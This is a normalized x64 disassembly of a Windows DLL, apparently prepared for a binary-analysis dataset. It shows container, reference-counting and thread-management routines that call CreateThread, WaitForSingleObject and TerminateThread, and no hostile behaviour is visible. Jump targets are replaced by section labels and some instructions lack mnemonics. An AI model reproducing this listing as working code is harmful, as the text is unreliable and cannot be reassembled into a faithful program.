mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rbx
call sub_180001ac0
nop
cmp rdi rsi
je r-xdata
sub_180004a00
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r9 rcx
mov [ rsp + 0x40 ] r8
xor r10d r10d
mov rax r8
add rsp 0x38
retn
test r8 r8
je r-xdata
add r8 0x10
mov [ rsp + 0x50 ] r8
add r9 0x10
jmp r-xdata
mov [ r8 ] r10
mov [ r8 + 0x8 ] r10
cmp r8 r9
je r-xdata
cmp r9 rdx
je r-xdata
mov rax [ r9 + 0x8 ]
mov [ r8 + 0x8 ] rax
mov [ r9 + 0x8 ] r10
mov rcx [ r8 ]
mov rax [ r9 ]
mov [ r8 ] rax
mov [ r9 ] rcx
sub_180004a70
mov rax rsp
push rbp
push r13
push r14
mov rbp rsp
sub rsp 0x70
mov [ rbp - 0x50 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rdi rcx
mov r12b 0x1
mov rax [ rcx + 0x80 ]
sub rax [ rcx + 0x78 ]
sar rax 0x3
xor r13d r13d
cmp rax 0x1
jbe r-xdata
mov rcx [ rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x30 ]
mov [ rbp - 0x38 ] r13
mov [ rbp - 0x30 ] r13
mov rdx rax
lea rcx [ rbp - 0x38 ]
call sub_180001480
nop
mov rax [ rbp - 0x38 ]
test rax rax
je r-xdata
mov ecx 0x1
mov r14d 0xffff
nop [ rax + rax ] ax
mov rbx [ rbp - 0x30 ]
cmp [ rax ] 0x0
jne r-xdata
mov rbx [ rbp - 0x40 ]
cmp [ rax + 0x8 ] r14w
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop rbp
retn
[ rbx + 0x8 ]
jne r-xdata
mov [ rbp - 0x18 ] r13
mov [ rbp - 0x10 ] r13
mov rbx [ rbp - 0x30 ]
test rbx rbx
je r-xdata
cmp [ rax + 0x8 ] 0x0
je r-xdata
inc r12b
movzx ecx r12b
mov rax [ rdi + 0x80 ]
sub rax [ rdi + 0x78 ]
sar rax 0x3
cmp rcx rax
jb r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov [ rbp - 0x28 ] r13
mov [ rbp - 0x20 ] r13
mov rbx [ rbp - 0x40 ]
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea rdx [ rbp - 0x18 ]
mov rcx rdi
call sub_180003d30
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rax [ rdi + 0x78 ]
mov rcx [ rax + rcx * 8 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov [ rbp - 0x48 ] r13
mov [ rbp - 0x40 ] r13
mov rdx rax
lea rcx [ rbp - 0x48 ]
call sub_1800034c0
nop
mov rax [ rbp - 0x48 ]
test rax rax
je r-xdata
mov rbx [ rbp - 0x40 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea rdx [ rbp - 0x28 ]
mov rcx rdi
call sub_180004460
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rcx [ rbp - 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov ecx 0x64
call [ Sleep@IAT ]
nop
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x30 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
mov rcx [ rbp - 0x40 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x40 ]
nop [ rax + rax ] eax
mov rbx [ rbp - 0x30 ]
mov r8 rbx
mov rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_1800011a0
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
mov rbx [ rbp - 0x40 ]
mov r8 rbx
mov rdx [ rbp - 0x48 ]
lea rcx [ rbp - 0x28 ]
call sub_1800011a0
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_180004c90
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
mov rbp rsp
sub rsp 0x70
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov ecx 0x30
call sub_18001c84c
mov [ rbp - 0x40 ] rax
xor r14d r14d
test rax rax
je r-xdata
mov rsi r14
mov rcx rax
call sub_180008850
mov rsi rax
jmp r-xdata
cmp rcx [ rdi + 0xb0 ]
jne r-xdata
lea rax [ rbp - 0x40 ]
cmp rdx rax
ja r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088d0
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] r14
mov [ rbp - 0x30 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
call sub_180003b50
mov rcx [ rdi + 0x68 ]
mov rax [ rcx ]
mov r8d [ rw-data ]
lea rdx [ rbp - 0x30 ]
call [ rax + 0x8 ]
mov rcx [ rdi + 0x70 ]
mov r8 [ rcx ]
mov edx eax
call [ r8 + 0x8 ]
mov r12 rax
mov ecx [ rw-data ]
xor r12 rcx
mov [ rbp - 0x40 ] r12
mov r13 [ rdi + 0xa0 ]
mov rdx r13
sub r13 r13
sar r13 0x3
mov rcx [ rdi + 0xa8 ]
lea rax [ rbp - 0x40 ]
cmp rax rcx
jae r-xdata
mov rax [ rdi + 0xa8 ]
test rax rax
je r-xdata
mov edx 0x1
lea rcx [ rdi + 0xa0 ]
call sub_180003cb0
lea r12 [ rbp - 0x40 ]
sub r12 rdx
sar r12 0x3
cmp rcx [ rdi + 0xb0 ]
jne r-xdata
add [ rdi + 0xa8 ] 0x8
mov r8 [ rdi + 0xa8 ]
lea rdx [ r8 - 0x8 ]
mov rax [ rdi + 0xa0 ]
lea rcx [ rax + r13 * 8 ]
cmp rcx rdx
je r-xdata
mov [ rax ] r12
mov rax [ rdi + 0xa0 ]
mov rcx [ rdi + 0xa8 ]
test rcx rcx
je r-xdata
mov edx 0x1
lea rcx [ rdi + 0xa0 ]
call sub_180003cb0
mov [ rdi + 0xc0 ] 0x0
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] r14
mov [ rbp - 0x30 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
call sub_180003b50
mov rcx [ rdi + 0x68 ]
mov rax [ rcx ]
mov r8d [ rw-data ]
lea rdx [ rbp - 0x30 ]
call [ rax + 0x8 ]
test eax eax
je r-xdata
cmp rdx r8
je r-xdata
mov rax [ rax + r12 * 8 ]
mov [ rcx ] rax
jmp r-xdata
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] r14
mov [ rbp - 0x30 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
call sub_180003b50
mov rcx [ rdi + 0x68 ]
mov rax [ rcx ]
mov r8d [ rw-data ]
lea rdx [ rbp - 0x30 ]
call [ rax + 0x8 ]
test eax eax
je r-xdata
mov [ rdi + 0xe8 ] eax
mov [ rsp + 0x20 ] r14
xor r9d r9d
call sub_180003530
mov r8d 0xa
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rbp - 0x30 ]
mov rcx rsi
call sub_1800092e0
mov rcx [ rdi + 0x68 ]
mov r9 [ rcx ]
xor r8d r8d
mov rdx rax
call [ r9 + 0x10 ]
mov r12 rax
test rax rax
je r-xdata
mov [ rdi + 0xec ] eax
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rbp - 0x30 ]
mov rcx rsi
call sub_1800092e0
mov rcx [ rdi + 0x68 ]
mov r9 [ rcx ]
xor r8d r8d
mov rdx rax
call [ r9 + 0x10 ]
mov r12 rax
test rax rax
je r-xdata
mov rdx rax
mov rcx [ rdi + 0x50 ]
call sub_18000b550
mov rbx rax
mov rcx [ r12 ]
test rcx rcx
je r-xdata
test rsi rsi
je r-xdata
mov rdx rax
mov rcx [ rdi + 0x50 ]
call sub_18000b550
mov rbx rax
mov rcx [ r12 ]
test rcx rcx
je r-xdata
mov rcx r12
call j_sub_18001c80c
test rbx rbx
je r-xdata
call sub_18001c80c
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rcx rsi
call sub_180008890
mov rcx rsi
call j_sub_18001c80c
mov rcx r12
call j_sub_18001c80c
test rbx rbx
je r-xdata
call sub_18001c80c
mov r8 [ rbx + 0x20 ]
mov rdx [ rbx + 0x18 ]
mov rcx [ rdi + 0x50 ]
call sub_18000b410
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov r8 [ rbx + 0x20 ]
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] r14
mov [ rbp - 0x30 ] r14w
shr r8 0x1
mov rdx [ rbx + 0x18 ]
lea rcx [ rbp - 0x30 ]
call sub_180003b50
nop
lea rdx [ rbp - 0x30 ]
mov rcx [ rdi + 0x58 ]
call sub_18000def0
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
mov rcx rbx
call j_sub_18001c80c
nop
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
call sub_18001c80c
mov rcx [ rbp - 0x30 ]
call j_sub_18001c80c
sub_180005040
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rbp rcx
mov ecx 0x190
call [ Sleep@IAT ]
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x88 ] rax
xor r15d r15d
test rax rax
je r-xdata
mov rbx r15
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
lea r8d [ r15 + 0x5a ]
lea rdx [ rw-data ]
mov rcx rax
call sub_180008860
mov rbx rax
jmp r-xdata
mov rcx [ rbp + 0x70 ]
mov r8 [ rcx ]
mov rdx rdi
call [ r8 + 0x10 ]
test al al
je r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov rcx rbx
call j_sub_1800088e0
mov rdi rax
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x90 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rdi
call sub_18001c80c
mov rcx rbp
call sub_180004c90
mov rcx [ rbp + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov r13 [ rbp + 0x80 ]
sub r13 [ rbp + 0x78 ]
sar r13 0x3
mov r12d r13d
mov eax 0x8
mul r12
mov rbx 0xffffffffffffffff
cmovo rax rbx
mov rcx rax
call j_sub_18001c84c
mov rsi rax
mov eax 0x4
mul r12
cmovo rax rbx
mov rcx rax
call j_sub_18001c84c
mov r14 rax
mov [ rsp + 0x80 ] r15d
test r13d r13d
je r-xdata
or edx 0xffffffff
mov rcx [ rsi ]
call [ WaitForSingleObject@IAT ]
mov rcx [ rsi ]
call [ CloseHandle@IAT ]
cmp r13d 0x1
jbe r-xdata
mov rbx r15
mov rdi rax
nop
mov rcx rsi
call j_sub_18001c80c#2
mov rcx r14
call j_sub_18001c80c#2
lea rbx [ rsi + 0x8 ]
mov r12 rsi
neg r12
lea edi [ r13 - 0x1 ]
nop [ rax ] eax
mov r9 [ rbp + 0x78 ]
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] r15d
mov r9 [ rbx + r9 ]
lea r8 [ sub_180003060 ]
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
mov [ rbx + rsi ] rax
add rdi 0x4
add rbx 0x8
dec r12
jne r-xdata
mov rcx [ rbx ]
call [ CloseHandle@IAT ]
add rbx 0x8
dec rdi
jne r-xdata
lea rdx [ rsp + 0x80 ]
mov rcx [ rbx ]
call [ GetExitCodeThread@IAT ]
mov edx [ rsp + 0x80 ]
mov rcx [ rbx ]
call [ TerminateThread@IAT ]
lea rcx [ r12 + rbx ]
mov rax [ rbp + 0x78 ]
mov rcx [ rcx + rax ]
mov rax [ rcx ]
call [ rax + 0x50 ]
mov edx 0x3e8
mov rcx [ rbx ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
sub_180005250
cmp rdx r8
je r-xdata
retn
push rsi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rdi
mov rsi r8
lea rdi [ rdx + 0x8 ]
nop [ rax + rax ] eax
add rdi 0x10
lea rax [ rdi - 0x8 ]
cmp rax rsi
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
mov rdi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rsi
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_1800052c0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
call sub_180004840
nop
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
sub_180005340
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x1fffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
lea rcx [ rdx * 8 ]
call sub_18001c84c
test rax rax
jne r-xdata
sub_1800053b0
push rsi
push rdi
sub rsp 0x28
mov rdi rdx
mov rdx [ rcx + 0x10 ]
mov rsi rcx
mov rcx 0xfffffffffffffff
mov rax rcx
sub rax rdx
cmp rax rdi
jae r-xdata
mov [ rsp + 0x40 ] rbx
mov r8d 0x8
mov [ rsp + 0x48 ] rbp
mov rax rdx
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x20 ] r14
shr rax 0x1
cmp rax r8
cmovb rax r8
cmp rdi rax
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbp [ rsi + 0x18 ]
lea rcx [ rsi + 0x29 ]
add rdx rdi
call sub_180005340
mov rcx [ rsi + 0x8 ]
mov rbx [ rsi + 0x10 ]
shl rbx 0x3
lea r13 [ rbp * 8 ]
mov r14 rax
lea rdx [ r13 + rcx ]
sub rbx rdx
add rbx rcx
lea rcx [ r13 + rax ]
and rbx 0xfffffffffffffff8
mov r8 rbx
call sub_18001c4a0
mov rdx [ rsi + 0x8 ]
add rax rbx
mov rcx rax
cmp rbp rdi
ja r-xdata
sub rcx rax
cmp rdx rcx
cmovbe rdi rax
lea rbx [ rdi * 8 ]
mov r8 rbx
and r8 0xfffffffffffffff8
call sub_18001c4a0
mov r11 [ rsi + 0x8 ]
mov rcx r14
lea rdx [ rbx + r11 ]
sub r13 rdx
add r13 r11
sar r13 0x3
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_18001c4a0
add rax rbx
test rdi rdi
je r-xdata
sar r13 0x3
mov [ rsp + 0x50 ] r12
mov r12 rdi
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_18001c4a0
add rax rbx
sub r12 rbp
je r-xdata
mov rcx [ rsi + 0x8 ]
mov r13 [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
mov r8 rdi
mov rcx rax
shl r8 0x3
mov r12 [ rsp + 0x50 ]
test rbp rbp
je r-xdata
shl r12 0x3
xor edx edx
mov rcx rax
mov r8 r12
call sub_18001c9f0
add [ rsi + 0x10 ] rdi
mov [ rsi + 0x8 ] r14
mov r14 [ rsp + 0x20 ]
add rsp 0x28
pop rdi
pop rsi
retn
call j_sub_18001c80c
shl rbp 0x3
mov rcx r14
mov r8 rbp
jmp r-xdata
xor edx edx
call sub_18001c9f0
sub_180005540
push rbx
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rdx [ rcx + 0x18 ]
mov rax [ rcx + 0x8 ]
mov [ rsp + 0x38 ] rdi
mov rdx [ rax + rdx * 8 ]
mov rdi [ rdx + 0x8 ]
test rdi rdi
je r-xdata
inc [ rbx + 0x18 ]
mov rax [ rbx + 0x18 ]
mov rdi [ rsp + 0x38 ]
xor edx edx
cmp [ rbx + 0x10 ] rax
mov rcx rax
cmovbe rcx rdx
dec [ rbx + 0x20 ]
mov [ rbx + 0x18 ] rcx
jne r-xdata
[ rdi + 0x8 ]
mov [ rsp + 0x30 ] rsi
jne r-xdata
mov [ rbx + 0x18 ] rdx
mov rsi [ rsp + 0x30 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
sub_1800055c0
push rbx
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rsi rdx
mov rbx rcx
mov rax [ rcx + 0x20 ]
inc rax
cmp [ rcx + 0x10 ] rax
ja r-xdata
mov rdi [ rbx + 0x18 ]
add rdi [ rbx + 0x20 ]
mov rax [ rbx + 0x10 ]
cmp rax rdi
ja r-xdata
mov edx 0x1
call sub_1800053b0
mov rax [ rbx + 0x8 ]
cmp [ rax + rdi * 8 ] 0x0
jne r-xdata
sub rdi rax
mov rax [ rbx + 0x8 ]
mov r9 [ rax + rdi * 8 ]
mov [ rsp + 0x70 ] r9
mov [ rsp + 0x78 ] r9
test r9 r9
je r-xdata
mov ecx 0x10
call sub_18001c84c
test rax rax
je r-xdata
inc [ rbx + 0x20 ]
add rsp 0x40
pop rdi
pop rsi
pop rbx
retn
xor eax eax
mov [ r9 ] rax
mov [ r9 + 0x8 ] rax
mov r8 [ rsi + 0x8 ]
mov rdx [ rsi ]
test r8 r8
je r-xdata
mov [ rsp + 0x60 ] rax
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x28 ]
call sub_18001c398
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_18001c8f0
int3
mov rcx [ rbx + 0x8 ]
mov [ rcx + rdi * 8 ] rax
jmp r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
nop [ rax ] eax
mov rcx r9
call sub_1800011a0
nop
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_1800056c0
mov rax rsp
push r13
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rsi rcx
mov rax [ rcx ]
call [ rax + 0x28 ]
test al al
jne r-xdata
xor r13d r13d
nop [ rax ] eax
mov eax 0x1
jmp r-xdata
call [ rax + 0x30 ]
nop
xor eax eax
jmp r-xdata
call [ rax + 0x38 ]
cmp [ rsi + 0x30 ] 0x0
je r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop r13
retn
mov rax [ rsi ]
mov rcx rsi
cmp [ rsi + 0xa ] 0x0
jne r-xdata
lea rcx [ rsi + 0x10 ]
lea rdx [ rsp + 0x48 ]
call sub_180010710
mov rcx rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rax [ rax ]
mov rax r13
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdx r13
mov [ rsp + 0x28 ] rdx
mov rbx r13
mov [ rsp + 0x30 ] rbx
mov rdi [ rcx + 0x8 ]
mov r12 [ rcx ]
test rdi rdi
je r-xdata
sub rcx rdx
mov rcx [ rcx + 0x10 ]
mov rdx [ rax + 0x10 ]
cmp rdx rcx
ja r-xdata
lea rdi [ rsp + 0x38 ]
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x40 ] r13
test rbx rbx
je r-xdata
nop
mov rax [ rsi ]
mov rdx rdi
mov rcx rsi
call [ rax + 0x40 ]
lea rcx [ rsi + 0x10 ]
call sub_180005540
nop
test rbx rbx
je r-xdata
nop
mov rbx [ rsp + 0x30 ]
mov rdx [ rsp + 0x28 ]
lea ecx [ rax + 0x1 ]
[ rdi + 0x8 ] ecx
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
jne r-xdata
mov eax [ rdi + 0x8 ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov r8 rbx
mov rcx rdi
call sub_1800011a0
mov rbx rdi
mov [ rsp + 0x30 ] rbx
mov rdx r12
mov [ rsp + 0x28 ] rdx
jmp r-xdata
[ rcx + 0x8 ]
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
sub_180005880
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
cmp [ rdx ] 0x0
je r-xdata
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
add rcx 0x10
call sub_1800055c0
nop
mov al 0x1
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_1800058f0
push rbx
sub rsp 0x20
mov rdx [ rcx ]
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
mov r8 [ rcx + 0x8 ]
call sub_180005250
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180005930
mov [ rsp + 0x20 ] rbx
push rdi
push r12
push r13
sub rsp 0x20
mov rdi r9
mov rbx r8
mov r12 rdx
mov r13 rcx
cmp r8 r9
je r-xdata
mov [ rdx ] rbx
mov rbx [ rsp + 0x58 ]
mov rax r12
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov [ rsp + 0x40 ] rbp
mov rbp [ rcx + 0x8 ]
mov [ rsp + 0x48 ] rsi
mov rsi rbx
cmp r9 rbp
je r-xdata
mov rbp [ r13 + 0x8 ]
mov rdi rsi
cmp rsi rbp
je r-xdata
nop [ rax ] eax
mov rbp [ rsp + 0x40 ]
mov [ r13 + 0x8 ] rsi
mov rsi [ rsp + 0x48 ]
mov [ r12 ] rbx
mov rax r12
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov [ rsp + 0x50 ] r14
xor r14d r14d
nop [ rax ] eax
mov rdx rdi
mov rcx rsi
call sub_180003f60
add rdi 0x28
add rsi 0x28
cmp rdi rbp
jne r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
add rdi 0x28
cmp rdi rbp
jne r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov r14 [ rsp + 0x50 ]
sub_180005a10
push r12
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rbx rcx
mov rax 0xfffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x4
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
add rcx 0x18
call sub_180003210
mov r12 rax
mov [ rsp + 0x58 ] rax
movzx r8d [ rsp + 0x58 ]
mov [ rsp + 0x28 ] r8b
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rax
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_180004a00
nop
mov r8 [ rbx + 0x8 ]
mov rdx [ rbx ]
mov rsi r8
sub rsi rdx
test rdx rdx
je r-xdata
shl rdi 0x4
add rdi r12
mov [ rbx + 0x10 ] rdi
and rsi 0xfffffffffffffff0
add rsi r12
mov [ rbx + 0x8 ] rsi
mov [ rbx ] r12
mov rcx rbx
call sub_180005250
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180005af0
mov r11 rsp
mov [ r11 + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ r11 + 0x20 ] rbx
mov r12 rdx
mov r13 rcx
xor edi edi
mov [ r11 + 0x8 ] rdi
movzx eax [ rdx ]
mov [ rsp + 0x28 ] ax
movzx eax [ rdx + 0x2 ]
mov [ rsp + 0x2a ] al
movzx eax [ rdx + 0x3 ]
mov [ rsp + 0x2b ] al
lea rbp [ rdx + 0x8 ]
mov rdx rbp
lea rcx [ r11 - 0x48 ]
call sub_180002700
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x28 ]
call sub_1800099d0
mov rsi rax
lea ecx [ rdi + 0x28 ]
call sub_18001c84c
mov rbx rax
test rax rax
je r-xdata
mov rbx rdi
mov rdx [ rsp + 0x80 ]
mov [ rax ] rdi
mov [ rax + 0x8 ] di
mov [ rax + 0xa ] dil
mov [ rax + 0xc ] edi
mov [ rax + 0x10 ] dil
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdx
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
cmp rdx 0x200000
cmova ecx eax
mov [ rbx + 0x11 ] cl
jmp r-xdata
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
mov rdx rbx
mov rcx [ r13 + 0x50 ]
call sub_18000b4e0
mov rsi rax
test rax rax
jne r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088d0
mov r8d 0x8
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088c0
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call sub_1800092e0
mov rcx [ r13 + 0x68 ]
mov r10 [ rcx ]
movzx r9d [ r12 ]
mov r8 rax
mov rdx rsi
call [ r10 + 0x20 ]
movzx r12d al
test rdi rdi
je r-xdata
mov rcx rax
call sub_180008850
mov rdi rax
mov rcx rbp
call sub_180002680
xor al al
jmp r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180008890
mov rcx rdi
call j_sub_18001c80c
mov rbx [ rsp + 0x98 ]
add rsp 0x50
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rbx
call j_sub_18001c80c
nop
call sub_18001c80c
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx rsi
call j_sub_18001c80c
nop
mov rcx rbp
call sub_180002680
movzx eax r12b
call sub_18001c80c
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
sub_180005cd0
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rsi rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rax rcx
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rdx + 0x8 ]
mov r11 [ rdx ]
